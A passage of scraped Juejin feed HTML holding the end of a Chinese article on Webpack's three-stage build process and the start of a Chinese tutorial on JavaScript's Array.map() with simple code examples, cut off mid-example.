                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多前端开发者每天都在用 Webpack，对着 <code>webpack.config.js</code> 复制粘贴。但你是否想过，当你按下 <code>npm run build</code> 的那一刻，Webpack 内部到底发生了什么？</p>
<p>理解 Webpack 的构建流程，不仅仅是为了通过面试（虽然这是高频考点），更是为了让你在遇到“构建失败”、“打包太慢”或“需要写插件”时，能够上帝视角般地定位问题。</p>
<p>如果把 Webpack 比作一个<strong>超级面包工厂</strong>，那么构建流程就是从采购面粉（源代码）到包装出库（最终 Bundle）的全过程。我们将这个过程拆解为三个核心阶段。</p>
<hr/>
<h2 data-id="heading-0">第一阶段：初始化 (Initialization) —— 工厂启动</h2>
<p>这阶段主要是在做准备工作，读取配置，把机器开起来。</p>
<h3 data-id="heading-1">1. 初始化参数</h3>
<p>Webpack 的第一步是“阅读说明书”。它会将配置文件 (<code>webpack.config.js</code>) 中的配置与 Shell 命令行参数（如 <code>--mode production</code>）进行合并，得到最终的配置对象。</p>
<h3 data-id="heading-2">2. 实例化 Compiler</h3>
<p>用上一步得到的参数，初始化一个 <code>Compiler</code> 对象。</p>
<ul>
<li><strong>地位</strong>：它是 Webpack 的“厂长”，全局唯一。</li>
<li><strong>作用</strong>：它保存了完整的配置环境，负责指挥接下来的所有生产工作。</li>
</ul>
<h3 data-id="heading-3">3. 加载插件 (Load Plugins)</h3>
<p>Webpack 遍历配置中的 <code>plugins</code> 数组，调用每个插件的 <code>apply</code> 方法。</p>
<ul>
<li><strong>关键动作</strong>：插件们此时开始在 Compiler 的各个生命周期钩子（Hooks）上进行<strong>注册监听</strong>。这就好比工厂里的各种传感器和机械臂已经就位，准备在特定的时间点干活。</li>
</ul>
<h3 data-id="heading-4">4. 确定入口</h3>
<p>根据配置中的 <code>entry</code>，找出所有的入口文件，准备开始真正的构建。</p>
<blockquote>
<p><strong>涉及的核心 Hooks</strong>: <code>entryOption</code>, <code>afterPlugins</code>, <code>run</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-5">第二阶段：构建阶段 (Make) —— 原料加工</h2>
<p>这是最核心、最耗时的阶段。Webpack 从入口文件出发，像爬虫一样解析整个项目。</p>
<h3 data-id="heading-6">1. 编译模块 (Compile)</h3>
<p>从 <code>entry</code> 文件开始，Webpack 会创建一个 Module 对象。</p>
<h3 data-id="heading-7">2. Loader 转译</h3>
<p><strong>“翻译官”进场</strong>。Webpack 原生只认识 JS 和 JSON。如果遇到 <code>.css</code>, <code>.vue</code>, <code>.ts</code> 等文件，它会去配置里找对应的 <code>module.rules</code>。</p>
<ul>
<li><strong>执行顺序</strong>：Loader 通常是从右向左（或从下向上）执行的。</li>
<li><strong>结果</strong>：所有非 JS 文件最终都被“翻译”成了标准的 JS 内容。</li>
</ul>
<h3 data-id="heading-8">3. 解析代码 (Parse &amp; AST)</h3>
<p>Loader 翻译完后，Webpack 使用解析器（通常是 Acorn）将 JS 代码转换成 <strong>AST (抽象语法树)</strong> 。</p>
<h3 data-id="heading-9">4. 分析依赖 (Dependency Graph)</h3>
<p>Webpack 遍历 AST，寻找 <code>import</code>、<code>require</code> 等语句。一旦发现依赖，就将其收集起来，加入到待处理列表中。</p>
<h3 data-id="heading-10">5. 递归编译</h3>
<p>对上一步找到的每一个依赖模块，<strong>重复执行</strong>上述的 "创建 -&gt; Loader转译 -&gt; AST解析 -&gt; 分析依赖" 过程。 这个过程一直持续到所有模块都处理完毕。</p>
<h3 data-id="heading-11">6. 完成模块图</h3>
<p>递归结束后，Webpack 内存中就形成了一棵完整的<strong>依赖树（Dependency Graph）</strong> 。此时，Webpack 清楚地知道项目中哪个文件依赖了哪个文件。</p>
<blockquote>
<p><strong>涉及的核心 Hooks</strong>: <code>make</code>, <code>buildModule</code>, <code>normalModuleLoader</code>, <code>succeedModule</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-12">第三阶段：生成阶段 (Seal &amp; Emit) —— 装箱打包</h2>
<p>原料都处理好了，现在的任务是将零散的模块组装成最终的输出文件。</p>
<h3 data-id="heading-13">1. 封装 (Seal)</h3>
<p><code>compilation.seal()</code> 被调用。此时，Webpack 停止接收新的模块。</p>
<ul>
<li><strong>优化时机</strong>：Tree Shaking（去除无用代码）等优化操作通常就在这里进行分析。</li>
</ul>
<h3 data-id="heading-14">2. 组装 Chunk (Chunking)</h3>
<p>根据入口（Entry）和代码分割（SplitChunks）规则，Webpack 将多个 Module 合并成一个或多个 <strong>Chunk（代码块）</strong> 。</p>
<ul>
<li><em>例子：你的 <code>main.js</code> 引用了 <code>React</code>。React 可能会被分包成 <code>vendors~main.chunk.js</code>。</em></li>
</ul>
<h3 data-id="heading-15">3. 生成资源 (Assets)</h3>
<p>Webpack 根据 Chunk 的内容，套用模板（Template），生成最终的代码字符串。 此时，资源保存在<strong>内存</strong>的 <code>compilation.assets</code> 对象中，形式是 Key-Value 结构。</p>
<h3 data-id="heading-16">4. 输出文件 (Emit)</h3>
<p>这是修改文件的<strong>最后机会</strong>（很多插件会在 <code>emit</code> 钩子修改最终产物）。 Webpack 根据配置的 <code>output.path</code> 和 <code>filename</code>，将内存中的 assets 真正写入到<strong>文件系统（磁盘）</strong> 。</p>
<blockquote>
<p><strong>涉及的核心 Hooks</strong>: <code>seal</code>, <code>optimizeChunks</code>, <code>emit</code>, <code>done</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-17">总结：流程速查图</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/823d4ae7bbab4f2e92d7d17891d77f10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCR5Y2_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764573179&amp;x-signature=UK5tTg9dXWAHtcMSPMGJivfUGfs%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-18">附：高频面试题锦囊</h2>
<p>看完流程，这三个问题你应该能秒答：</p>
<p><strong>Q1: Loader 和 Plugin 的本质区别是什么？</strong></p>
<ul>
<li><strong>Loader</strong>：工作在“构建阶段”（阶段二），本质是<strong>转换器</strong>（如把 Less 转 CSS），专注于文件内容的转换。</li>
<li><strong>Plugin</strong>：贯穿整个生命周期，本质是<strong>扩展器</strong>。它监听 Webpack 广播出的各种事件（Hooks），在合适的时机改变输出结果（如压缩代码、注入环境变量）。</li>
</ul>
<p><strong>Q2: Tree Shaking 发生在什么时候？</strong></p>
<ul>
<li>发生在 <strong>Seal (封装)</strong> 阶段。Webpack 依靠 ES6 Module 的静态结构，分析出哪些 export 没有被引用，然后在生成 Chunk 时将死代码剔除。</li>
</ul>
<p><strong>Q3: Babel 在哪里工作？</strong></p>
<ul>
<li>Babel 是作为一个 <strong>Loader</strong> 工作的。它在 AST 解析之前，将 ES6+ 源码转译为 Webpack 能更好理解（或兼容性更好）的 ES5 代码。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript Array map() 方法详解]]></title>    <link>https://juejin.cn/post/7576175307351654415</link>    <guid>https://juejin.cn/post/7576175307351654415</guid>    <pubDate>2025-11-24T07:18:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576175307351654415" data-draft-id="7575810396202614818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript Array map() 方法详解"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T07:18:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新晨437"/> <meta itemprop="url" content="https://juejin.cn/user/3957868231143133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript Array map() 方法详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3957868231143133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新晨437
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:18:49.000Z" title="Mon Nov 24 2025 07:18:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript Array map() 方法详解</h2>
<p><code>map()</code> 是 JavaScript 数组方法中非常强大且常用的方法之一，它允许我们遍历数组并对每个元素执行指定的操作，然后返回一个新数组。</p>
<h3 data-id="heading-1">基本语法</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> newArray = array.<span class="hljs-title function_">map</span>(<span class="hljs-title function_">callback</span>(currentValue[, index[, array]])[, thisArg])
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>callback</code>：对每个数组元素执行的函数
<ul>
<li><code>currentValue</code>：当前正在处理的元素</li>
<li><code>index</code>（可选）：当前元素的索引</li>
<li><code>array</code>（可选）：调用 map 的数组本身</li>
</ul>
</li>
<li><code>thisArg</code>（可选）：执行 callback 时使用的 this 值</li>
</ul>
<h3 data-id="heading-2">基本用法示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 示例1：将数字数组中的每个元素乘以2</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> doubled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(doubled); <span class="hljs-comment">// [2, 4, 6, 8, 10]</span>

<span class="hljs-comment">// 示例2：将字符串数组转换为大写</span>
<span class="hljs-keyword">const</span> fruits = [<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'orange'</span>];
<span class="hljs-keyword">const</span> upperCaseFruits = fruits.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">fruit</span> =&gt;</span> fruit.<span class="hljs-title function_">toUpperCase</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(upperCaseFruits); <span class="hljs-comment">// ['APPLE', 'BANANA', 'ORANGE']</span>
</code></pre>
<h3 data-id="heading-3">实际应用场景</h3>
<h4 data-id="heading-4">1. 处理对象数组</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> users = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span> }
];

<span class="hljs-comment">// 提取用户名数组</span>
<span class="hljs-keyword">const</span> userNames = users.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">name</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userNames); <span class="hljs-comment">// ['Alice', 'Bob', 'Charlie']</span>

<span class="hljs-comment">// 创建新的对象数组</span>
<span class="hljs-keyword">const</span> userProfiles = users.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> ({
  <span class="hljs-attr">userId</span>: user.<span class="hljs-property">id</span>,
  <span class="hljs-attr">fullName</span>: user.<span class="hljs-property">name</span>,
  <span class="hljs-attr">isAdult</span>: user.<span class="hljs-property">age</span> &gt;= <span class="hljs-number">18</span>
}));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userProfiles);
<span class="hljs-comment">// [</span>
<span class="hljs-comment">//   { userId: 1, fullName: 'Alice', isAdult: true },</span>
<span class="hljs-comment">//   { userId: 2, fullName: 'Bob', isAdult: true },</span>
<span class="hljs-comment">//   { userId: 3, fullName: 'Charlie', isAdult: true }</span>
<span class="hljs-comment">// ]</span>
</code></pre>
<h4 data-id="heading-5">2. 处理 DOM 元素</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 假设有以下 HTML 结构</span>
<span class="hljs-comment">// &lt;div class="item" data-price="10"&gt;Product A&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div class="item" data-price="15"&gt;Product B&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div class="item" data-price="20"&gt;Product C&lt;/div&gt;</span>

<span class="hljs-keyword">const</span> items = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.item'</span>);
<span class="hljs-keyword">const</span> prices = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(items).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> ({
  <span class="hljs-attr">name</span>: item.<span class="hljs-property">textContent</span>,
  <span class="hljs-attr">price</span>: <span class="hljs-built_in">parseFloat</span>(item.<span class="hljs-property">dataset</span>.<span class="hljs-property">price</span>)
}));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices);
<span class="hljs-comment">// [</span>
<span class="hljs-comment">//   { name: 'Product A', price: 10 },</span>
<span class="hljs-comment">//   { name: 'Product B', price: 15 },</span>
<span class="hljs-comment">//   { name: 'Product C', price: 20 }</span>
<span class="hljs-comment">// ]</span>
</code></pre>
<h4 data-id="heading-6">3. 数据转换和格式化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> dates = [<span class="hljs-string">'2023-01-15'</span>, <span class="hljs-string">'2023-02-20'</span>, <span class="hljs-string">'2023-03-25'</span>];
<span class="hljs-keyword">const</span> formattedDates = dates.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">date</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> [year, month, day] = date.<span class="hljs-title function_">split</span>(<span class="hljs-string">'-'</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${day}</span>/<span class="hljs-subst">${month}</span>/<span class="hljs-subst">${year}</span>`</span>;
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formattedDates); <span class="hljs-comment">// ['15/01/2023', '20/02/2023', '25/03/2023']</span>

<span class="hljs-comment">// 处理数字格式化</span>
<span class="hljs-keyword">const</span> prices = [<span class="hljs-number">19.99</span>, <span class="hljs-number">29.5</span>, <span class="hljs-number">45.75</span>];
<span class="hljs-keyword">const</span> formattedPrices = prices.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">price</span> =&gt;</span> <span class="hljs-string">`$<span class="hljs-subst">${price.toFixed(<span class="hljs-number">2</span>)}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formattedPrices); <span class="hljs-comment">// ['$19.99', '$29.50', '$45.75']</span>
</code></pre>
<h3 data-id="heading-7">使用索引参数</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> items = [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>];
<span class="hljs-keyword">const</span> indexedItems = items.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>. <span class="hljs-subst">${item}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(indexedItems); <span class="hljs-comment">// ['1. a', '2. b', '3. c', '4. d']</span>
</code></pre>
<h3 data-id="heading-8">使用 thisArg 参数</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> multiplier = {
  <span class="hljs-attr">factor</span>: <span class="hljs-number">3</span>,
  <span class="hljs-attr">multiply</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">number</span>) {
    <span class="hljs-keyword">return</span> number * <span class="hljs-variable language_">this</span>.<span class="hljs-property">factor</span>;
  }
};

<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];
<span class="hljs-keyword">const</span> tripled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">multiply</span>(num);
}, multiplier);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tripled); <span class="hljs-comment">// [3, 6, 9, 12]</span>
</code></pre>
<h3 data-id="heading-9">链式调用</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>];

<span class="hljs-keyword">const</span> result = numbers
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) <span class="hljs-comment">// 筛选偶数</span>
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>)          <span class="hljs-comment">// 乘以2</span>
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num + <span class="hljs-number">10</span>);        <span class="hljs-comment">// 加10</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// [14, 18, 22, 26, 30]</span>
</code></pre>
<h3 data-id="heading-10">注意事项</h3>
<ol>
<li><strong>不修改原数组</strong>：<code>map()</code> 不会改变原数组</li>
<li><strong>返回新数组</strong>：总是返回一个新数组</li>
<li><strong>跳过空位</strong>：对于稀疏数组，空位会被跳过</li>
<li><strong>性能考虑</strong>：对于大型数组，考虑性能影响</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 原数组不会被修改</span>
<span class="hljs-keyword">const</span> original = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> mapped = original.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(original); <span class="hljs-comment">// [1, 2, 3] (不变)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped);   <span class="hljs-comment">// [2, 4, 6] (新数组)</span>

<span class="hljs-comment">// 处理稀疏数组</span>
<span class="hljs-keyword">const</span> sparseArray = [<span class="hljs-number">1</span>, , <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> result = sparseArray.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// [2, empty, 6]</span>
</code></pre>
<h3 data-id="heading-11">与 forEach 的区别</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];

<span class="hljs-comment">// map() 返回新数组</span>
